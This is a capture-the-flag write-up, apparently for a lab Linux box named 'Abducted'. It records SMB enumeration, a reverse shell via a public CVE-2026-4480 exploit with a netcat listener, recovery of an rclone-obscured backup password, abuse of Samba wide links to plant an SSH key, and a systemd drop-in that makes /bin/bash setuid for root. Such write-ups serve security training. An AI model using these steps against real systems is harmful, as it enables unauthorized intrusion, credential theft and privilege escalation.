# Abducted - Medium · Linux

```
nmap -sVT 10.129.31.227
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-19 15:52 EDT
Nmap scan report for 10.129.31.227
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds

```

```
nmap -sV -sC -p139,445 10.129.31.227
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-19 15:55 EDT
Nmap scan report for 10.129.31.227
Host is up (0.033s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4

Host script results:
| smb2-time: 
|   date: 2026-06-19T19:55:19
|_  start_date: N/A
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -15s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
```

```
smbclient -N -L //10.129.31.227/    

        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.129.31.227 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```
smbclient //10.129.31.227/projects -N
```
```
smbclient //10.129.31.227/transfer -N
```
```
smbclient //10.129.31.227/HP-Reception -N
```


```
enum4linux-ng -A 10.129.31.227 
```

Output: user

```
    Users via RPC on 10.129.31.227    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 1 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 1 user(s) via 'enumdomusers'
[+] After merging user results we have 1 user(s) total:
'1000':                                                                                                                                                                                                                                     
  username: scott                                                                                                                                                                                                                           
  name: Scott Mercer                                                                                                                                                                                                                        
  acb: '0x00000010'                                                                                                                                                                                                                         
  description: ''
```
Output: smb
```
 ==========================================
|    SMB Dialect Check on 10.129.31.227    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.0.2: true                                                                                                                                                                                                                           
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: false
```

```
rpcclient -U "" -N 10.129.244.177

enumdomusers
netshareenum

```

```
rpcclient -U "" -N 10.129.31.227 
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
rpcclient $> netshareenum
netname: HP-Reception
        remark: Reception printer
        path:   C:\var\spool\samba
        password:
netname: projects
        remark: Hartley Group Project Files
        path:   C:\srv\projects
        password:
netname: transfer
        remark: Staff file transfer
        path:   C:\srv\transfer
        password:
rpcclient $> 
```
References: 

- https://explore.alas.aws.amazon.com/CVE-2026-4480.html
- https://access.redhat.com/security/cve/cve-2026-4480

Exploit:

https://github.com/TheCyberGeek/CVE-2026-4480-PoC/blob/main/exploit.py

```
exploit.py
```
Terminal 1:
```
sudo nc -lnvp <hostip>
```
Terminal 2:
```
python3 exploit.py 10.129.31.227 <listenerip> 4444
```
Shell and exploit showing: 

<img width="1545" height="390" alt="image" src="https://github.com/user-attachments/assets/1a4917cf-3d27-4117-bafd-7ddb5f782318" />

```
whoami
```

```
find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
```
Output:

```
/var/lib/ucf/cache/:etc:samba:smb.conf
/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
/opt/offsite-backup/rclone.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf
```
Example reading files

```
cat /path/to/file
```

```
nobody@abducted:/home$ cat /opt/offsite-backup/rclone.conf
cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix

```

user: `svc-backup`
password: `HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw`

rclone:

```
$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

ssh:

```
ssh scott@10.129.31.227
The authenticity of host '10.129.31.227 (10.129.31.227)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.31.227' (ED25519) to the list of known hosts.
scott@10.129.31.227's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
<SNIP>

scott@abducted:~$ 

```

```
scott@abducted:~$ pwd
/home/scott
scott@abducted:~$ ls
user.txt
scott@abducted:~$ cat user.txt
bcXXXXXXXXXXXXXXXXXXXXX3abc
scott@abducted:~$ 
```

```
scott@abducted:~$ sudo su
[sudo] password for scott: 

scott is not in the sudoers file.
scott@abducted:~$
```

```
cat /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
```

```
$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Create a link that make scott able to write in transfer/marcus shared file:

```
ln -s /home/marcus /srv/transfer/marcus
```

```
smbclient //10.129.31.227/transfer -U 'scott%iXzvcib3SrpZ'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 19 16:26:47 2026
  ..                                  D        0  Fri Jun 19 16:26:47 2026
  marcus                              D        0  Thu Jun  4 09:47:57 2026

                5768764 blocks of size 1024. 2299236 blocks available
```

```
smb: \marcus\> mkdir .ssh
smb: \marcus\> cd .ssh
```

Create ssh key in kali files: 
```
ssh-keygen -t rsa -b 4096
```
```
ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FBwZR9oWoVc5IRpQNfLy0zJ9jjmSA8CsrKkfgPbmbas kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|      .+B*O.oo   |
|     o  o@ =o    |
|      + * =  .   |
|.  . . o = o     |
|o.  o   S = o .  |
|...o     . = =   |
|  +o      + + .  |
| .o...     o .   |
|...Eoo.          |
+----[SHA256]-----+

```
check:

```
ls -l ~/.ssh
```


in smb marcus:
```
smb: \marcus\.ssh\> put /home/kali/.ssh/id_rsa.pub authorized_keys
putting file /home/kali/.ssh/id_rsa.pub as \marcus\.ssh\authorized_keys (6.6 kb/s) (average 6.6 kb/s)

```

```
smb: \marcus\.ssh\> setmode authorized_keys a-r
```

Permissions to the key:

```
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 700 ~/.ssh
```

```
ssh -i /root/.ssh/id_rsa marcus@10.129.31.227
```

```
find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d

```

```
cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF
```

```
systemctl daemon-reload
systemctl restart smbd
```

```
bash -p
```

```
bash-5.2# whoami
root
```

```
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
4aXXXXXXXXXXXXXXXXXXXXc940
bash-5.2# 
```




